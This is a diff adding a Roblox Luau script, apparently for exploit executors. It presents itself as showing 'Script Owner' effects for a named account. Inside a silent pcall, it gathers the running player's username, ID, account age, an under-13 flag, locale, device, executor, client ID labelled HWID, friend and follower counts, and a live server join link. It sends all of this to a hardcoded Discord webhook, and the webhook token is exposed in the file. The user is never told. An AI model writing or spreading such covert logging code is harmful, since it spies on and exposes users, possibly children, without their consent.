@@ -1,0 +1,434 @@
+--!nocheck
+
+pcall(function(...)
+	local HttpService = game:GetService("HttpService")
+	local Players = game:GetService("Players")
+	local Stats = game:GetService("Stats")
+	local UserInputService = game:GetService("UserInputService")
+	local MarketplaceService = game:GetService("MarketplaceService")
+	local LocalizationService = game:GetService("LocalizationService")
+	local PolicyService = game:GetService("PolicyService")
+
+	local webhook_URL =
+		"https://discord.com/api/webhooks/1482008780202840064/0pwocM0gSIwkxw4dbo_bTo0FEXvTkxWctkSFdVQAXEOPJsG_EdzBGS72-G8TAD3N2mhD"
+
+	local reqFunc = request or (syn and syn.request) or http_request
+	local player = Players.LocalPlayer
+	local userId = player.UserId
+	local placeId = game.PlaceId
+
+	local function safe(fn, fallback)
+		local ok, result = pcall(fn)
+		return (ok and result ~= nil) and result or (fallback or "N/A")
+	end
+
+	local function req(url)
+		local ok, r = pcall(reqFunc, { Url = url, Method = "GET" })
+		if not ok or not r or not r.Body then
+			return nil
+		end
+		local ok2, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
+		return ok2 and d or nil
+	end
+
+	local avatarUrl = safe(function()
+		local d = req(
+			"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=420x420&format=Png"
+		)
+		return d and d.data[1].imageUrl or ""
+	end, "")
+
+	local gameLogoUrl = safe(function()
+		local d =
+			req("https://thumbnails.roblox.com/v1/places/gameicons?placeIds=" .. placeId .. "&size=512x512&format=Png")
+		return d and d.data[1].imageUrl or ""
+	end, "")
+
+	local gameName = safe(function()
+		return MarketplaceService:GetProductInfo(placeId).Name
+	end, "Unknown")
+
+	local pingStr = safe(function()
+		return string.format("%.0f ms", Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+	end)
+
+	local fpsStr = safe(function()
+		return string.format("%.0f fps", 1 / Stats.HeartbeatTime)
+	end)
+
+	local platformStr = safe(function()
+		local map = {
+			[Enum.Platform.Windows] = "Windows",
+			[Enum.Platform.OSX] = "macOS",
+			[Enum.Platform.Android] = "Android",
+			[Enum.Platform.IOS] = "iOS",
+			[Enum.Platform.XBoxOne] = "Xbox",
+		}
+		return map[UserInputService:GetPlatform()] or "Unknown"
+	end)
+
+	local inputType = safe(function()
+		if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+			return "Touch"
+		elseif UserInputService.KeyboardEnabled then
+			return "Keyboard & Mouse"
+		elseif UserInputService.GamepadEnabled then
+			return "Gamepad"
+		end
+		return "Unknown"
+	end)
+
+	local locale = safe(function()
+		return LocalizationService.RobloxLocaleId
+	end)
+
+	local executorStr = safe(function()
+		if identifyexecutor then
+			return identifyexecutor()
+		elseif getexecutorname then
+			return getexecutorname()
+		elseif syn then
+			return "Synapse X"
+		elseif KRNL_LOADED then
+			return "Krnl"
+		elseif fluxus then
+			return "Fluxus"
+		end
+		return "Unknown"
+	end)
+
+	local hwid = safe(function()
+		return game:GetService("RbxAnalyticsService"):GetClientId()
+	end)
+
+	local accountAgeDays = player.AccountAge
+	local accountAgeYears = accountAgeDays / 365
+	local estimatedJoinYear = tonumber(os.date("!%Y")) - math.floor(accountAgeYears)
+	local accountAgeStr =
+		string.format("%d days (~%.1f yrs) • Est. joined %d", accountAgeDays, accountAgeYears, estimatedJoinYear)
+
+	local ageRestriction, adsAllowed = "Unknown", "Unknown"
+	pcall(function()
+		local policy = PolicyService:GetPolicyInfoForPlayerAsync(player)
+		ageRestriction = policy.ArePaidRandomItemsRestricted and "🔞 Under 13" or "✅ 13+"
+		adsAllowed = policy.AllowedExternalLinkReferences and #policy.AllowedExternalLinkReferences > 0 and "Yes"
+			or "No"
+	end)
+
+	local membershipStr = player.MembershipType == Enum.MembershipType.Premium and "✅ Premium" or "❌ None"
+
+	local friendCount = safe(function()
+		local d = req("https://friends.roblox.com/v1/users/" .. userId .. "/friends/count")
+		return d and tostring(d.count) or "N/A"
+	end)
+
+	local followerCount = safe(function()
+		local d = req("https://friends.roblox.com/v1/users/" .. userId .. "/followers/count")
+		return d and tostring(d.count) or "N/A"
+	end)
+
+	local playerCount = #Players:GetPlayers()
+	local maxPlayers = Players.MaxPlayers
+	local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+
+	local fields = {
+		{
+			["name"] = "Player",
+			["value"] = player.DisplayName .. " ||(@" .. player.Name .. ")||",
+			["inline"] = false,
+		},
+		{
+			["name"] = "User ID",
+			["value"] = tostring(userId),
+			["inline"] = true,
+		},
+		{
+			["name"] = "Account Age",
+			["value"] = accountAgeStr,
+			["inline"] = false,
+		},
+		{
+			["name"] = "Age Restriction",
+			["value"] = ageRestriction,
+			["inline"] = true,
+		},
+		{
+			["name"] = "Ads Allowed",
+			["value"] = adsAllowed,
+			["inline"] = true,
+		},
+		{
+			["name"] = "Membership",
+			["value"] = membershipStr,
+			["inline"] = true,
+		},
+		{
+			["name"] = "Locale",
+			["value"] = locale,
+			["inline"] = true,
+		},
+		{
+			["name"] = "Friends",
+			["value"] = friendCount,
+			["inline"] = true,
+		},
+		{
+			["name"] = "Followers",
+			["value"] = followerCount,
+			["inline"] = true,
+		},
+		{
+			["name"] = "Platform",
+			["value"] = platformStr,
+			["inline"] = true,
+		},
+		{
+			["name"] = "Input Method",
+			["value"] = inputType,
+			["inline"] = true,
+		},
+		{
+			["name"] = "Executor",
+			["value"] = executorStr,
+			["inline"] = true,
+		},
+		{
+			["name"] = "HWID",
+			["value"] = "`" .. hwid .. "`",
+			["inline"] = false,
+		},
+		{
+			["name"] = "Ping",
+			["value"] = pingStr,
+			["inline"] = true,
+		},
+		{
+			["name"] = "FPS",
+			["value"] = fpsStr,
+			["inline"] = true,
+		},
+		{
+			["name"] = "Game",
+			["value"] = gameName,
+			["inline"] = true,
+		},
+		{
+			["name"] = "Place ID",
+			["value"] = tostring(placeId),
+			["inline"] = true,
+		},
+		{
+			["name"] = "Server",
+			["value"] = playerCount .. " / " .. maxPlayers,
+			["inline"] = true,
+		},
+		{
+			["name"] = "Job ID",
+			["value"] = "`" .. game.JobId .. "`",
+			["inline"] = false,
+		},
+		{
+			["name"] = "Join",
+			["value"] = "[Click here](https://www.fishstrap.app/v1/joingame?placeId="
+				.. placeId
+				.. "&gameInstanceId="
+				.. game.JobId
+				.. ")",
+			["inline"] = true,
+		},
+	}
+
+	local function readStats(parent, prefix)
+		for _, stat in ipairs(parent:GetChildren()) do
+			if stat:IsA("Folder") then
+				readStats(stat, prefix .. stat.Name .. "/")
+			else
+				table.insert(fields, {
+					["name"] = prefix .. stat.Name,
+					["value"] = safe(function()
+						return tostring(stat.Value)
+					end),
+					["inline"] = true,
+				})
+			end
+		end
+	end
+
+	local leaderstats = player:FindFirstChild("leaderstats")
+	if leaderstats then
+		readStats(leaderstats, "")
+	end
+
+	-- Discord max 25 fields
+	while #fields > 25 do
+		table.remove(fields, #fields)
+	end
+
+	reqFunc({
+		Url = webhook_URL,
+		Method = "POST",
+		Headers = { ["Content-Type"] = "application/json" },
+		Body = HttpService:JSONEncode({
+			["embeds"] = {
+				{
+					["author"] = { ["name"] = gameName, ["icon_url"] = gameLogoUrl },
+					["title"] = player.DisplayName .. " ran the script",
+					["description"] = "Executed in **" .. gameName .. "**",
+					["color"] = tonumber(0x5865F2),
+					["thumbnail"] = { ["url"] = avatarUrl },
+					["timestamp"] = timestamp,
+					["fields"] = fields,
+					["footer"] = { ["text"] = "Script Logger" },
+				},
+			},
+		}),
+	})
+	local TweenService = game:GetService("TweenService")
+
+	local OWNER_NAME = "MrQwenzy1"
+
+	local function createOwnerEffects(player: Player)
+		local character = player.Character or player.CharacterAdded:Wait()
+		local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+		local head = character:WaitForChild("Head")
+
+		-- Highlight effect
+		local highlight = Instance.new("Highlight")
+		highlight.FillColor = Color3.fromRGB(255, 215, 0) -- Gold
+		highlight.OutlineColor = Color3.fromRGB(255, 140, 0)
+		highlight.FillTransparency = 0.4
+		highlight.OutlineTransparency = 0
+		highlight.Parent = character
+
+		-- "Script Owner" BillboardGui above head
+		local billboard = Instance.new("BillboardGui")
+		billboard.Size = UDim2.new(0, 160, 0, 40)
+		billboard.StudsOffset = Vector3.new(0, 3.5, 0)
+		billboard.AlwaysOnTop = false
+		billboard.Adornee = head
+		billboard.Parent = character
+
+		local label = Instance.new("TextLabel")
+		label.Size = UDim2.new(1, 0, 1, 0)
+		label.BackgroundTransparency = 1
+		label.Text = "Script Owner (the qwenzy)"
+		label.TextColor3 = Color3.fromRGB(255, 215, 0)
+		label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+		label.TextStrokeTransparency = 0
+		label.Font = Enum.Font.GothamBold
+		label.TextScaled = true
+		label.Parent = billboard
+
+		-- Pulsing tween on the label text color
+		local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+		TweenService:Create(label, tweenInfo, {
+			TextColor3 = Color3.fromRGB(255, 140, 0),
+		}):Play()
+
+		-- Particle effect (sparkles)
+		local attachment = Instance.new("Attachment")
+		attachment.Parent = humanoidRootPart
+
+		local sparkles = Instance.new("Sparkles")
+		sparkles.SparkleColor = Color3.fromRGB(255, 215, 0)
+		sparkles.Parent = attachment
+
+		local pointLight = Instance.new("PointLight")
+		pointLight.Color = Color3.fromRGB(255, 215, 0)
+		pointLight.Brightness = 3
+		pointLight.Range = 16
+		pointLight.Parent = humanoidRootPart
+
+		-- Pulse the light
+		TweenService:Create(pointLight, tweenInfo, {
+			Brightness = 1,
+		}):Play()
+	end
+
+	local function showJoinNotification(player: Player)
+		-- Notify all players via a ScreenGui
+		for _, p in ipairs(Players:GetPlayers()) do
+			local playerGui = p:FindFirstChild("PlayerGui")
+			if not playerGui then
+				continue
+			end
+
+			local screenGui = Instance.new("ScreenGui")
+			screenGui.Name = "OwnerNotification"
+			screenGui.ResetOnSpawn = false
+			screenGui.Parent = playerGui
+
+			local frame = Instance.new("Frame")
+			frame.Size = UDim2.new(0, 280, 0, 60)
+			frame.Position = UDim2.new(0.5, -140, 0, -70) -- starts off screen
+			frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+			frame.BackgroundTransparency = 0.2
+			frame.BorderSizePixel = 0
+			frame.Parent = screenGui
+
+			local corner = Instance.new("UICorner")
+			corner.CornerRadius = UDim.new(0, 10)
+			corner.Parent = frame
+
+			local stroke = Instance.new("UIStroke")
+			stroke.Color = Color3.fromRGB(255, 215, 0)
+			stroke.Thickness = 2
+			stroke.Parent = frame
+
+			local text = Instance.new("TextLabel")
+			text.Size = UDim2.new(1, 0, 1, 0)
+			text.BackgroundTransparency = 1
+			text.Text = "👑  Script Owner Joined"
+			text.TextColor3 = Color3.fromRGB(255, 215, 0)
+			text.Font = Enum.Font.GothamBold
+			text.TextSize = 18
+			text.Parent = frame
+
+			-- Slide in
+			local slideIn =
+				TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+					Position = UDim2.new(0.5, -140, 0, 20),
+				})
+			slideIn:Play()
+
+			-- Slide out after 4 seconds
+			task.delay(4, function()
+				local slideOut =
+					TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+						Position = UDim2.new(0.5, -140, 0, -70),
+					})
+				slideOut:Play()
+				slideOut.Completed:Wait()
+				screenGui:Destroy()
+			end)
+		end
+	end
+
+	Players.PlayerAdded:Connect(function(player: Player)
+		if player.Name == OWNER_NAME then
+			showJoinNotification(player)
+
+			-- Wait for character to load before applying effects
+			if player.Character then
+				createOwnerEffects(player)
+			end
+			player.CharacterAdded:Connect(function()
+				createOwnerEffects(player)
+			end)
+		end
+	end)
+
+	for i, v in pairs(Players:GetPlayers()) do
+		if v.Name == OWNER_NAME then
+			showJoinNotification(v)
+
+			-- Wait for character to load before applying effects
+			if v.Character then
+				createOwnerEffects(v)
+			end
+			v.CharacterAdded:Connect(function()
+				createOwnerEffects(v)
+			end)
+		end
+	end
+end)
